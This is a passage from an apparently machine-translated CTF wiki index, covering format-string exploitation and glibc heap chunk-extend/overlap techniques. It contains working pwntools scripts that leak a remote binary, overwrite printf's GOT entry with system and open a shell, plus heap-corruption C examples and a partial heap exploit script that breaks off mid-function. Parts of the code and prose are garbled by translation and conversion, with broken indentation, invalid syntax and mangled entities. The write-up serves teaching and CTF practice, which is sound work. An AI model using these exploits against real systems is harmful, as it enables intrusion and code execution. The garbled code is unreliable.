{exam\ns_is_fla\n\ng}\\x00\\x00\\x00\\x00\\x00\\x00\n\n\\x00\\x00\\x00\\x00\\xfe\\x7f\\x00\\x00\n</code></pre>"},{"location":"pwn/linux/fmtstr/fmtstr_example/#example-2-blind-hijacking-got","title":"Example 2 - Blind hijacking got","text":"<p>The source code and deployment files are already in the blind_fmt_got folder.</p>"},{"location":"pwn/linux/fmtstr/fmtstr_example/#determine-the-number-of-programs_1","title":"Determine the number of programs","text":"<p>By simply testing, we found that this program is a format string vulnerability function, and the program is 64-bit.</p> <pre><code>\u279c  blind_fmt_got git:(master) \u2717 nc localhost 9999\n\n%p\n\n0x7fff3b9774c0\n</code></pre> <p>This time, I didn't show it back. I tried it again and found that there was nothing wrong with it. Then we had to leak a wave of source programs.</p>"},{"location":"pwn/linux/fmtstr/fmtstr_example/#determining-the-offset_2","title":"Determining the offset","text":"<p>Before the leak procedure, we still have to determine the offset of the format string, as follows</p> <pre><code>\u279c  blind_fmt_got git:(master) \u2717 nc localhost 9999\n\naaaaaaaa%p%p%p%p%p%p%p%p%p\n\naaaaaaaa0x7ffdbf920fb00x800x7f3fc9ccd2300x4006b00x7f3fc9fb0ab00x61616161616161610x70257025702570250x70257025702570250xa7025\n</code></pre> <p>Based on this, we can know that the starting address offset of the format string is 6.</p>"},{"location":"pwn/linux/fmtstr/fmtstr_example/#leaking-binary","title":"leaking binary","text":"<p>Since the program is 64-bit, we started leaking from 0x400000. In general, blind typing with a format string vulnerability can be read into the '\\x00' character, otherwise it can't be revealed how to play, after that, the output must be truncated by '\\x00', this is because The output functions of the format string exploit are truncated by '\\x00'. . So we can use the leak code below.</p> <pre><code>##coding=utf8\n\nfrom pwn import *\n\n\n\n##context.log_level = 'debug'\n\nip = \"127.0.0.1\"\n\nport = 9999\n\n\n\n\n\ndef leak(addr):\n\n    # leak addr for three times\n\nnum = 0\n    while num &lt; 3:\n\n        try:\n\n            print 'leak addr: ' + hex(addr)\n\n            sh = remote(ip, port)\n\n            payload = '%00008$s' + 'STARTEND' + p64(addr)\n\n#\u8bf4\u660e\u6709\\n, a new line appears\n            if '\\x0a' in payload:\n\n                return None\n\n            sh.sendline(payload)\n\n            data = sh.recvuntil('STARTEND', drop=True)\n\n            sh.close()\n\n            return data\n\n        except Exception:\n\nnum + = 1\n            continue\n\n    return None\n\n\n\ndef getbinary():\n\n    addr = 0x400000\n\n    f = open('binary', 'w')\n\n    while addr &lt; 0x401000:\n\n        data = leak(addr)\n\n        if data is None:\n\n            f.write('\\xff')\n\n            addr += 1\n\nelif len (data) == 0:\n            f.write('\\x00')\n\n            addr += 1\n\n        else:\n\n            f.write(data)\n\naddr + = len (data)\n    f.close()\n\ngetbinary()\n</code></pre> <p>It should be noted that in the payload, it is necessary to judge whether or not '\\n' appears, because this will cause the source program to read only the previous content, and there is no way to leak the memory, so it is necessary to skip such an address.</p>"},{"location":"pwn/linux/fmtstr/fmtstr_example/#ary","title":"\u5206\u6790\u658cary","text":"<p>Use IDA to open the leaked binary, change the program base address, and then simply look at it, you can basically determine the address of the source program main function.</p> <p><code>`</code>asm seg000:00000000004005F6                 push    rbp</p> <p>seg000:00000000004005F7                 mov     rbp, rsp</p> <p>seg000:00000000004005FA                 add     rsp, 0FFFFFFFFFFFFFF80h</p> <p>seg000:00000000004005FE</p> <p>seg000:00000000004005FE loc_4005FE:                             ; CODE XREF: seg000:0000000000400639\u0019j</p> <p>seg000:00000000004005FE                 lea     rax, [rbp-80h]</p> <p>seg000:0000000000400602                 mov     edx, 80h ; '\u20ac'</p> <p>seg000:0000000000400607                 mov     rsi, rax</p> <p>seg000: 000000000040060A mov edi, 0 seg000:000000000040060F                 mov     eax, 0</p> <p>seg000:0000000000400614                 call    sub_4004C0</p> <p>seg000:0000000000400619                 lea     rax, [rbp-80h]</p> <p>seg000: 000000000040061D mov rdi, rax seg000:0000000000400620                 mov     eax, 0</p> <p>seg000:0000000000400625                 call    sub_4004B0</p> <p>seg000:000000000040062A                 mov     rax, cs:601048h</p> <p>seg000: 0000000000400631 mov rdi, rax seg000:0000000000400634                 call    near ptr unk_4004E0</p> <p>seg000:0000000000400639                 jmp     short loc_4005FE</p> <pre><code>It can be basically determined that sub\\_4004C0 is a read function, because the read function has a total of three parameters, which is basically read. In addition, the sub\\_4004B0 called below should be the output function, and then a function should be called again, and then jump back to the read function, the program should be a while 1 loop, always executing.\n\n\n#### Using ideas\n\n\nAfter analyzing the above, we can determine the following basic ideas\n\n\n- leak the address of the printf function,\n- Get the corresponding libc and system function address\n- Modify printf address to system function address\n- Read /bin/sh; to get the shell\n\n\n#### Using the program\n\n\nThe procedure is as follows.\n\n```python\n\n##coding=utf8\n\nimport math\n\nfrom pwn import *\n\nfrom LibcSearcher import LibcSearcher\n\n##context.log_level = 'debug'\n\ncontext.arch = 'amd64'\n\nip = \"127.0.0.1\"\n\nport = 9999\n\n\n\n\n\ndef leak(addr):\n\n    # leak addr for three times\n\nnum = 0\n    while num &lt; 3:\n\n        try:\n\n            print 'leak addr: ' + hex(addr)\n\n            sh = remote(ip, port)\n\n            payload = '%00008$s' + 'STARTEND' + p64(addr)\n\n#\u8bf4\u660e\u6709\\n, a new line appears\n            if '\\x0a' in payload:\n\n                return None\n\n            sh.sendline(payload)\n\n            data = sh.recvuntil('STARTEND', drop=True)\n\n            sh.close()\n\n            return data\n\n        except Exception:\n\nnum + = 1\n            continue\n\n    return None\n\n\n\n\n\ndef getbinary():\n\n    addr = 0x400000\n\n    f = open('binary', 'w')\n\n    while addr &lt; 0x401000:\n\n        data = leak(addr)\n\n        if data is None:\n\n            f.write('\\xff')\n\n            addr += 1\n\nelif len (data) == 0:\n            f.write('\\x00')\n\n            addr += 1\n\n        else:\n\n            f.write(data)\n\naddr + = len (data)\n    f.close()\n\n\n\n\n\n##getbinary()\n\nread_got = 0x601020\n\nprintf_got = 0x601018\n\nsh = remote(ip, port)\n\n## let the read get resolved\n\nsh.sendline('a')\n\nsh.recv()\n\n## get printf addr\n\npayload = '%00008$s' + 'STARTEND' + p64(read_got)\n\nsh.sendline(payload)\n\ndata = sh.recvuntil (&amp;#39;STARTEND&amp;#39;, drop = True) .ljust (8, &amp;#39;x00&amp;#39;)\nsh.recv()\n\nread_addr = u64(data)\n\n\n\n## get system addr\n\nlibc = LibcSearcher('read', read_addr)\n\nlibc_base = read_addr - libc.dump('read')\n\nsystem_addr = libc_base + libc.dump('system')\n\nlog.success('system addr: ' + hex(system_addr))\n\nlog.success('read   addr: ' + hex(read_addr))\n\n## modify printf_got\n\npayload = fmtstr_payload(6, {printf_got: system_addr}, 0, write_size='short')\n\n## get all the addr\n\naddr = payload[:32]\n\npayload = '%32d' + payload[32:]\n\noffset = (int)(math.ceil(len(payload) / 8.0) + 1)\n\nfor i in range(6, 10):\n\n    old = '%{}$'.format(i)\n\n    new = '%{}$'.format(offset + i)\n\n    payload = payload.replace(old, new)\n\nremainer = len(payload) % 8\n\npayload += (8 - remainer) * 'a'\n\npayload += addr\n\nsh.sendline(payload)\n\nsh.recv()\n\n\n\n## get shell\n\nsh.sendline('/bin/sh;')\n\nsh.interactive()\n</code></pre> <p>What needs to be noted here is this code.</p> <pre><code>## modify printf_got\n\npayload = fmtstr_payload(6, {printf_got: system_addr}, 0, write_size='short')\n\n## get all the addr\n\naddr = payload[:32]\n\npayload = '%32d' + payload[32:]\n\noffset = (int)(math.ceil(len(payload) / 8.0) + 1)\n\nfor i in range(6, 10):\n\n    old = '%{}$'.format(i)\n\n    new = '%{}$'.format(offset + i)\n\n    payload = payload.replace(old, new)\n\nremainer = len(payload) % 8\n\npayload += (8 - remainer) * 'a'\n\npayload += addr\n\nsh.sendline(payload)\n\nsh.recv()\n</code></pre> <p>Fmtstr_payload directly get the payload will put the address in front, and this will lead to '\\x00' truncation of printf (About this problem, pwntools is currently developing an enhanced version of fmt_payload, it is estimated that it will be developed soon ). So I used some tricks to put it behind. The main idea is to place the address in the 8 byte alignment and modify the offset in the payload. have to be aware of is</p> <pre><code>offset = (int)(math.ceil(len(payload) / 8.0) + 1)\n</code></pre> <p>This line gives the offset of the modified address in the formatted string. The reason for this is that no matter how it is modified, the more characters in the order of '%order$hn' will not be greater than 8. Specific can be deduced by yourself.</p>"},{"location":"pwn/linux/fmtstr/fmtstr_example/#title","title":"Title","text":"<ul> <li>SuCTF2018 - lock2 (The organizer provided the docker image: suctf/2018-pwn-lock2)</li> </ul>"},{"location":"pwn/linux/fmtstr/fmtstr_intro/","title":"Format string vulnerability principle introduction","text":"<p>First, a brief introduction to the principles of formatting string vulnerabilities.</p>"},{"location":"pwn/linux/fmtstr/fmtstr_intro/#format-string-function-introduction","title":"Format string function introduction","text":"<p>The format string function accepts a variable number of arguments and uses the first argument as a format string, from which the parsed argument is parsed. In general, formatting a string function is to convert the data represented in the computer's memory into our human-readable string format. Almost all C/C++ programs use formatted string functions to output information, debug programs, or process strings. In general, formatted strings are mainly divided into three parts when utilized.</p> <ul> <li>Format string function</li> <li>format string</li> <li>Subsequent parameters, ** optional**</li> </ul> <p>Here we give a simple example, I believe that most people have been exposed to printf functions and the like. Then we will introduce them one by one.</p> <p></p>"},{"location":"pwn/linux/fmtstr/fmtstr_intro/#format-string-function","title":"Format string function","text":"<p>Common formatted string functions have</p> <ul> <li> <p>Enter</p> <ul> <li>scanf</li> </ul> </li> <li> <p>output</p> </li> </ul> Function Basic introduction <p>| printf | output to stdout | | fprintf | Output to the specified FILE stream | | vprintf | Formatting output to stdout based on parameter list | | vfprintf | Formatting output to the specified FILE stream according to the parameter list | | sprintf | Output to String | | snprintf | Output the specified number of bytes to the string | | vsprintf | Formatting output to a string based on a parameter list | | vsnprintf | Formatting Output Specified Bytes to Strings Based on Parameter List | | setproctitle | set argv | | syslog | output log | | err, verr, warn, vwarn \u7b49 | ... |</p>"},{"location":"pwn/linux/fmtstr/fmtstr_intro/#format-string","title":"Format string","text":"<p>Here we understand the format of the format string, the basic format is as follows</p> <pre><code>%[parameter][flags][field width][.precision][length]type\n</code></pre> <p>For the meaning of each pattern, please refer to the Wikipedia [format string] (https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96% E5%AD%97%E7%AC%A6%E4%B8%B2). The corresponding choices in the following patterns need to focus on</p> <ul> <li> <p>parameter</p> </li> <li> <p>n$, get the specified parameters in the format string</p> </li> <li> <p>flag</p> </li> <li> <p>field width</p> </li> <li> <p>the minimum width of the output</p> </li> <li> <p>precision</p> </li> <li> <p>the maximum length of the output</p> </li> <li>length, the length of the output</li> <li>hh, output one byte</li> <li>h, output a double byte</li> <li> <p>type</p> </li> <li> <p>d/i, signed integer</p> </li> <li>u, unsigned integer</li> <li>x/X, hexadecimal unsigned int. x uses lowercase letters; X uses uppercase letters. If the precision is specified, the number of the output is zero when it is insufficient. The default precision is 1. When the precision is 0 and the value is 0, the output is empty.</li> <li>o, octal unsigned int. If the precision is specified, the number of the output is zero when it is insufficient. The default precision is 1. When the precision is 0 and the value is 0, the output is empty.</li> <li>s, if the l flag is not used, the null end string is output until the upper limit specified by the precision; if no precision is specified, all bytes are output. If the l flag is used, the corresponding function parameter points to an array of type wchar_t, and each wide character is converted to a multi-byte character at the time of output, which is equivalent to calling the wcrtomb function.</li> <li>c, if the l flag is not used, convert the int parameter to unsigned char output; if the l flag is used, the wint_t parameter is converted to a wchart_t array containing two elements, the first element containing the character to be output The second element is a null wide character.</li> <li>p, void * type, output the value of the corresponding variable. Printf(\"%p\",a) prints the value of the variable a in the format of the address, printf(\"%p\", &amp;a) prints the address where the variable a is located.</li> <li>n, does not output characters, but writes the number of characters that have been successfully output to the variable pointed to by the corresponding integer pointer parameter.</li> <li>%, '<code>%</code>' literal, does not accept any flags, width.</li> </ul>"},{"location":"pwn/linux/fmtstr/fmtstr_intro/#parameters","title":"Parameters","text":"<p>It is the corresponding variable to be output.</p>"},{"location":"pwn/linux/fmtstr/fmtstr_intro/#format-string-vulnerability-principle","title":"Format string vulnerability principle","text":"<p>In the beginning, we will give a basic introduction to formatting strings, and here are some more detailed content. We said above that the format string function is parsed according to the format string function. ** Then the corresponding number of parameters to be parsed is naturally controlled by this format string**. For example, '%s' indicates that we will output a string argument.</p> <p>Let\u2019s continue with the above example as an example.</p> <p>![Basic example] (./figure/printf.png)</p> <p>For such an example, before entering the printf function (that is, printf has not been called yet), the layout on the stack from high address to low address is as follows</p> <pre><code>some value\n\n3.14\n\n123456\n\naddr of \"red\"\n\naddr of format string: Color %s...\n</code></pre> <p>**Note: Here we assume that the value above 3.14 is some unknown value. **</p> <p>After entering printf, the function first gets the first parameter, and one by one reads two characters.</p> <ul> <li>The current character is not % and is output directly to the corresponding standard output.</li> <li>the current character is %, continue reading the next character</li> <li>If there are no characters, an error is reported.</li> <li>If the next character is %, output %</li> <li>Otherwise, according to the corresponding characters, get the corresponding parameters, parse and output them</li> </ul> <p>So suppose that at this time we wrote the following when we wrote the program.</p> <pre><code>printf(\"Color %s, Number %d, Float %4.2f\");\n</code></pre> <p>At this point we can see that we did not provide the parameters, then how will the program run? The program will still run, parsing the three variables above the formatted string address on the stack into</p> <ol> <li>Parse the string corresponding to its address</li> <li>Parse the integer value corresponding to its content</li> <li>Parse the floating point value corresponding to its content</li> </ol> <p>For 2, 3, it doesn't matter, but for 1, if an inaccessible address, such as 0, is provided, the program will crash.</p> <p>This is basically the basic principle of formatting string vulnerabilities.</p>"},{"location":"pwn/linux/fmtstr/fmtstr_intro/#reference-reading","title":"Reference reading","text":"<ul> <li>https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2</li> </ul>"},{"location":"pwn/linux/glibc-heap/chunk_extend_overlapping/","title":"Chunk Extend and Overlapping","text":""},{"location":"pwn/linux/glibc-heap/chunk_extend_overlapping/#introduction","title":"Introduction","text":"<p>Chunk extend is a common use of heap vulnerabilities. The effect of chunk overlapping can be achieved by extend. This method of utilization requires the following timing and conditions:</p> <ul> <li>There is a heap-based vulnerability in the program</li> <li>Vulnerabilities can control data in chunk headers</li> </ul>"},{"location":"pwn/linux/glibc-heap/chunk_extend_overlapping/#principle","title":"Principle","text":"<p>The chunk extend technique can be generated by the various macros that ptmalloc uses when working with heap chunks.</p> <p>In ptmalloc, the operation of getting the chunk size is as follows <pre><code>/* Get size, ignoring use bits */\n\n#define chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))\n\n\n\n/* Like chunksize, but do not mask SIZE_BITS.  */\n\n#define chunksize_nomask(p) ((p)-&gt;mchunk_size)\n</code></pre></p> <p>One is to directly get the size of the chunk, not to ignore the mask part, and the other is to ignore the mask part.</p> <p>In ptmalloc, the operation of getting the next chunk block address is as follows <pre><code>/* Ptr to next physical malloc_chunk. */\n\n#define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))\n</code></pre></p> <p>That is, use the current block pointer plus the current block size.</p> <p>In ptmalloc, the operation of getting the previous chunk information is as follows <pre><code>/* Size of the chunk below P.  Only valid if prev_inuse (P).  */\n\n#define prev_size(p) ((p)-&gt;mchunk_prev_size)\n\n\n\n/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */\n\n#define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))\n</code></pre></p> <p>That is, the size of the previous block is obtained by malloc_chunk-&gt;prev_size, and then the obtained size is subtracted from the chunk address.</p> <p>In ptmalloc, the operation of determining whether the current chunk is in the use state is as follows: <pre><code>#define inuse(p)\n\n    ((((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)\n</code></pre></p> <p>That is, look at the prev_inuse field of the next chunk, and the next block address is calculated according to the size of the current chunk as we mentioned earlier.</p> <p>See the section \"Heap related data structures\" for more details.</p> <p>As can be seen from the above macros, ptmalloc uses the chunk header data to determine the usage of the chunk and to locate the chunks before and after the chunk. In short, chunk extend is achieved by controlling the size and pre_size fields to achieve overlapping operations.</p> <p>Similar to chunk extend, there is an operation called chunk shrink. Only the use of chunk extend is introduced here.</p>"},{"location":"pwn/linux/glibc-heap/chunk_extend_overlapping/#basic-example-1-extend-the-fastbin-of-inuse","title":"Basic example 1: Extend the fastbin of inuse","text":"<p>In simple terms, the effect of this utilization is to control the content of the second block by changing the size of the first block. Note that our examples are all in 64-bit programs. If you want to test under 32 bits, you can change the 8-byte offset to 4 bytes. <pre><code>int main(void)\n\n{\n\nvoid * ptr, * ptr1;\n\n\nPtr=malloc(0x10);//Assign the first 0x10 chunk\nMalloc (0x10); / / assign a second 0x10 chunk\n\n\n*(long long *)((long long)ptr-0x8)=0x41;// Modify the size field of the first block\n\n\n    free(ptr);\n\nPtr1=malloc(0x30);// Implement extend to control the content of the second block\n    return 0;\n\n}\n</code></pre></p> <p>When two malloc statements are executed, the heap's memory is distributed as follows <pre><code>0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk 1\n\n0x602010:   0x0000000000000000  0x0000000000000000\n\n0x602020:   0x0000000000000000  0x0000000000000021 &lt;=== chunk 2\n\n0x602030:   0x0000000000000000  0x0000000000000000\n\n0x602040:   0x0000000000000000  0x0000000000020fc1 &lt;=== top chunk\n</code></pre></p> <p>After that, we changed the size field of chunk1 to 0x41, which is because the size field of the chunk contains the size of the user control and the size of the header. As shown above, the size is exactly 0x40. This step can be obtained from heap overflow in the title. <pre><code>0x602000: 0x0000000000000000 0x0000000000000041 &amp;lt;=== Tamper size\n0x602010:   0x0000000000000000  0x0000000000000000\n\n0x602020:   0x0000000000000000  0x0000000000000021\n\n0x602030:   0x0000000000000000  0x0000000000000000\n\n0x602040:   0x0000000000000000  0x0000000000020fc1 \n</code></pre></p> <p>After executing free, we can see that chunk2 and chunk1 are combined into a 0x40 chunk and released. <pre><code>Fastbins[idx=0, size=0x10] 0x00\n\nFastbins[idx=1, size=0x20] 0x00\n\nFastbins[idx=2, size=0x30]  \u2190  Chunk(addr=0x602010, size=0x40, flags=PREV_INUSE) \n\nFastbins[idx=3, size=0x40] 0x00\n\nFastbins[idx=4, size=0x50] 0x00\n\nFastbins[idx=5, size=0x60] 0x00\n\nFastbins[idx=6, size=0x70] 0x00\n</code></pre></p> <p>Then we get the block of chunk1+chunk2 through malloc (0x30), then we can directly control the contents of chunk2, we also call this state the overlapping chunk. <pre><code>call   0x400450 &lt;malloc@plt&gt;\n\nmov QWORD PTR [rbp-0x8], rax\n\n\nrax = 0x602010\n</code></pre></p>"},{"location":"pwn/linux/glibc-heap/chunk_extend_overlapping/#basic-example-2-extend-the-smallbin-of-inuse","title":"Basic example 2: Extend the smallbin of inuse","text":"<p>Through a deep understanding of the implementation part of the heap, we know that the chunks in the fastbin range will be placed in the fastbin list, and the chunks that are not in this range will be placed in the unsorted bin list. In the following example, we use the size 0x80 to allocate the heap (as a comparison, the default maximum chunk for fastbin can be used as 0x70) <pre><code>int main()\n\n{\n\nvoid * ptr, * ptr1;\n\n\nPtr=malloc(0x80);//Assign the first chunk1 of 0x80\nMalloc (0x10); / / allocate the second 0x10 chunk2\nMalloc (0x10); / / prevent merger with top chunk\n\n\n* (int *) ((int) ptr-0x8) = 0xb1;\n    free(ptr);\n\n    ptr1=malloc(0xa0);\n\n}\n</code></pre></p> <p>In this example, because the allocated size is not in the range of fastbin, if it is connected to the top chunk when it is released, it will merge with the top chunk. So we need to allocate an additional chunk to separate the released chunk from the top chunk. <pre><code>0x602000: 0x0000000000000000 0x00000000000000b1 &amp;lt;===chunk1 tamper with the size field\n0x602010:   0x0000000000000000  0x0000000000000000\n\n0x602020:   0x0000000000000000  0x0000000000000000\n\n0x602030:   0x0000000000000000  0x0000000000000000\n\n0x602040:   0x0000000000000000  0x0000000000000000\n0x602050:   0x0000000000000000  0x0000000000000000\n\n0x602060:   0x0000000000000000  0x0000000000000000\n\n0x602070:   0x0000000000000000  0x0000000000000000\n\n0x602080:   0x0000000000000000  0x0000000000000000\n\n0x602090:   0x0000000000000000  0x0000000000000021 &lt;=== chunk2\n\n0x6020a0:   0x0000000000000000  0x0000000000000000\n\n0x6020b0: 0x0000000000000000 0x0000000000000021 &amp;lt;=== Prevent merged chunks\n0x6020c0:   0x0000000000000000  0x0000000000000000\n\n0x6020d0:   0x0000000000000000  0x0000000000020f31 &lt;=== top chunk\n</code></pre></p> <p>After release, chunk1 swallows the contents of chunk2 and puts them together into the unsorted bin. <pre><code>0x602000: 0x0000000000000000 0x00000000000000b1 &amp;lt;=== was put into the unsorted bin\n0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78\n\n0x602020:   0x0000000000000000  0x0000000000000000\n\n0x602030:   0x0000000000000000  0x0000000000000000\n\n0x602040:   0x0000000000000000  0x0000000000000000\n\n0x602050:   0x0000000000000000  0x0000000000000000\n\n0x602060:   0x0000000000000000  0x0000000000000000\n\n0x602070:   0x0000000000000000  0x0000000000000000\n\n0x602080:   0x0000000000000000  0x0000000000000000\n\n0x602090:   0x0000000000000000  0x0000000000000021\n\n0x6020a0:   0x0000000000000000  0x0000000000000000\n\n0x6020b0: 0x00000000000000b0 0x0000000000000020 &amp;lt;=== Note that this is marked as empty\n0x6020c0:   0x0000000000000000  0x0000000000000000\n\n0x6020d0:   0x0000000000000000  0x0000000000020f31 &lt;=== top chunk\n</code></pre></p> <pre><code>[+] unsorted_bins[0]: fw=0x602000, bk=0x602000\n\n \u2192   Chunk(addr=0x602010, size=0xb0, flags=PREV_INUSE)\n</code></pre> <p>When the allocation is made again, the chunk1 and chunk2 spaces are retrieved, and we can control the contents of chunk2. <pre><code>     0x4005b0 &lt;main+74&gt;        call   0x400450 &lt;malloc@plt&gt;\n\n\u2192 0x4005b5 &lt;main+79&gt; mov QWORD PTR [rbp-0x8], rax\n\n\n     rax : 0x0000000000602010\n</code></pre></p>"},{"location":"pwn/linux/glibc-heap/chunk_extend_overlapping/#basic-example-3-extend-the-free-smallbin","title":"Basic example 3: Extend the free smallbin","text":"<p>Example 3 is based on Example 2, this time we release chunk1 and then modify the size field of chunk1 in the unsorted bin. <pre><code>int main()\n\n{\n\nvoid * ptr, * ptr1;\n\n\nPtr=malloc(0x80);//Assign the first chunk1 of 0x80\nMalloc (0x10); / / assign the second 0x10 chunk2\n\n\nFree(ptr);//First release, so that chunk1 enters unsorted bin\n\n\n* (int *) ((int) ptr-0x8) = 0xb1;\n    ptr1=malloc(0xa0);\n\n}\n</code></pre></p> <p>The results after two malloc are as follows <pre><code>0x602000:   0x0000000000000000  0x0000000000000091 &lt;=== chunk 1\n\n0x602010:   0x0000000000000000  0x0000000000000000\n\n0x602020:   0x0000000000000000  0x0000000000000000\n\n0x602030:   0x0000000000000000  0x0000000000000000\n\n0x602040:   0x0000000000000000  0x0000000000000000\n\n0x602050:   0x0000000000000000  0x0000000000000000\n\n0x602060:   0x0000000000000000  0x0000000000000000\n\n0x602070:   0x0000000000000000  0x0000000000000000\n\n0x602080:   0x0000000000000000  0x0000000000000000\n\n0x602090:   0x0000000000000000  0x0000000000000021 &lt;=== chunk 2\n\n0x6020a0:   0x0000000000000000  0x0000000000000000\n\n0x6020b0:   0x0000000000000000  0x0000000000020f51\n</code></pre></p> <p>We first release chunk1 to make it into the unsorted bin. <pre><code>     unsorted_bins[0]: fw=0x602000, bk=0x602000\n\n \u2192   Chunk(addr=0x602010, size=0x90, flags=PREV_INUSE)\n\n\n\n0x602000: 0x0000000000000000 0x0000000000000091 &amp;lt;=== Entering unsorted bin\n0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78\n\n0x602020:   0x0000000000000000  0x0000000000000000\n\n0x602030:   0x0000000000000000  0x0000000000000000\n\n0x602040:   0x0000000000000000  0x0000000000000000\n\n0x602050:   0x0000000000000000  0x0000000000000000\n\n0x602060:   0x0000000000000000  0x0000000000000000\n\n0x602070:   0x0000000000000000  0x0000000000000000\n\n0x602080:   0x0000000000000000  0x0000000000000000\n\n0x602090:   0x0000000000000090  0x0000000000000020 &lt;=== chunk 2\n\n0x6020a0:   0x0000000000000000  0x0000000000000000\n\n0x6020b0:   0x0000000000000000  0x0000000000020f51 &lt;=== top chunk\n</code></pre></p> <p>Then tamper with the size field of chunk1 <pre><code>0x602000: 0x0000000000000000 0x00000000000000b1 &amp;lt;=== size field was tampered with\n0x602010:   0x00007ffff7dd1b78  0x00007ffff7dd1b78\n\n0x602020:   0x0000000000000000  0x0000000000000000\n\n0x602030:   0x0000000000000000  0x0000000000000000\n\n0x602040:   0x0000000000000000  0x0000000000000000\n\n0x602050:   0x0000000000000000  0x0000000000000000\n\n0x602060:   0x0000000000000000  0x0000000000000000\n\n0x602070:   0x0000000000000000  0x0000000000000000\n\n0x602080:   0x0000000000000000  0x0000000000000000\n\n0x602090:   0x0000000000000090  0x0000000000000020\n\n0x6020a0:   0x0000000000000000  0x0000000000000000\n\n0x6020b0:   0x0000000000000000  0x0000000000020f51\n</code></pre></p> <p>At this point, the malloc allocation can be used to get the chunk of chunk1+chunk2, thus controlling the content of chunk2.</p>"},{"location":"pwn/linux/glibc-heap/chunk_extend_overlapping/#chunk-extendshrink-what-can-i-do","title":"Chunk Extend/Shrink What can I do?","text":"<p>In general, this technique does not directly control the execution flow of the program, but it can control the contents of the chunk. If chunks have string pointers, function pointers, etc., they can be used to leak information and control the execution flow.</p> <p>In addition, chunk overlap can be realized by extend, and the fd/bk pointer of the chunk can be controlled by overlapping, so that the use of fastbin attack can be realized.</p>"},{"location":"pwn/linux/glibc-heap/chunk_extend_overlapping/#basic-example-4-overlapping-after-extend","title":"Basic example 4: Overlapping after extend","text":"<p>Here we show backward overlapping through extend, which is also the most common case in CTF, and other uses can be achieved through overlay. <pre><code>int main()\n\n{\n\nvoid * ptr, * ptr1;\n\n\nPtr=malloc(0x10);//Assign the first 0x80 chunk1\nMalloc (0x10); / / allocate the second 0x10 chunk2\nMalloc (0x10); / / allocate the third 0x10 chunk3\nMalloc (0x10); / / allocate the 4th 0x10 chunk4\n* (int *) ((int) ptr-0x8) = 0x61;\n    free(ptr);\n\n    ptr1=malloc(0x50);\n\n}\n</code></pre> After the malloc (0x50) re-occupies the extend area, the 0x10 fastbin block can still be allocated and released normally. At this time, the overlay is already formed, and the fastbin attack can be realized by performing the operation on the overlapping.</p>"},{"location":"pwn/linux/glibc-heap/chunk_extend_overlapping/#basic-example-5-forwarding-through-extend","title":"Basic example 5: Forwarding through extend","text":"<p>This shows that the previous block is merged by modifying the pre_inuse field and the pre_size field. <pre><code>int main(void)\n\n{\n\n    void *ptr1,*ptr2,*ptr3,*ptr4;\n\n    ptr1=malloc(128);//smallbin1\n\n    ptr2=malloc(0x10);//fastbin1\n\n    ptr3=malloc(0x10);//fastbin2\n\n    ptr4=malloc(128);//smallbin2\n\nMalloc (0x10); / / prevent merge with top\n    free(ptr1);\n\n*(int *)((long long)ptr4-0x8)=0x90;//Modify the pre_inuse field\n*(int *)((long long)ptr4-0x10)=0xd0;//Modify the pre_size field\nFree(ptr4);//unlink for forward extend\nMalloc (0x150); / / placeholder block\n\n\n}\n</code></pre></p> <p>The forward extend utilizes the unbin mechanism of smallbin. By modifying the pre_size field, it can be merged across multiple chunks to implement overlapping.</p>"},{"location":"pwn/linux/glibc-heap/chunk_extend_overlapping/#hitcon-trainging-lab13","title":"HITCON Trainging lab13","text":"<p>[Topic link] (https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13)</p>"},{"location":"pwn/linux/glibc-heap/chunk_extend_overlapping/#basic-information","title":"Basic Information","text":"<pre><code>\u279c  hitcontraning_lab13 git:(master) file heapcreator\n\nheapcreator: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5e69111eca74cba2fb372dfcd3a59f93ca58f858, not stripped\n\n\u279c  hitcontraning_lab13 git:(master) checksec heapcreator\n\n[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/chunk_extend_shrink/hitcontraning_lab13/heapcreator'\n\n    Arch:     amd64-64-little\n\n    RELRO:    Partial RELRO\n\n    Stack:    Canary found\n\n    NX:       NX enabled\n\n    PIE:      No PIE (0x400000)\n</code></pre> <p>The program is a 64-bit dynamic linker, which mainly enables Canary protection and NX protection.</p>"},{"location":"pwn/linux/glibc-heap/chunk_extend_overlapping/#basic-skills","title":"basic skills","text":"<p>The program is probably a custom heap allocator, and each heap has two main members: size and content pointer. The main functions are as follows</p> <ol> <li>Create a heap, request the corresponding memory space according to the length entered by the user, and read the specified length content with read. The length is not detected here. When the length is negative, a heap overflow of any length will occur. Of course, the premise is that malloc can be done. In addition, NULL is not set after reading here.</li> <li>Edit the heap, read the specified content according to the specified index and the size of the previously stored heap, but the length read here will be one greater than before, so there will be a vulnerability of off by one**.</li> <li>Show the heap, output the size and content of the specified index heap.</li> <li>Delete the heap, delete the specified heap, and set the corresponding pointer to NULL.</li> </ol>"},{"location":"pwn/linux/glibc-heap/chunk_extend_overlapping/#use","title":"Use","text":"<p>Basic use ideas are as follows</p> <ol> <li>Use the off by one vulnerability to overwrite the size field of the next chunk to construct a fake chunk size.</li> <li>Apply the forged chunk size to create a chunk overlap and modify the key pointer.</li> </ol> <p>More specific is to look at the script directly.</p> <pre><code>#!/usr/bin/env python\n\n# -*- coding: utf-8 -*-\n\n\n\nfrom pwn import *\n\n\n\nr = process('./heapcreator')\n\nheap = ELF('./heapcreator')\n\nlibc = ELF('./libc.so.6')\n\n\n\n\n\ndef create(size, content):\n\n    r.recvuntil(\":\")\n\n    r.sendline(\"1\")\n\n    r.recvuntil(\":\")\n\n    r.sendline(str(size))\n\n    r.recvuntil(\":\")\n\n    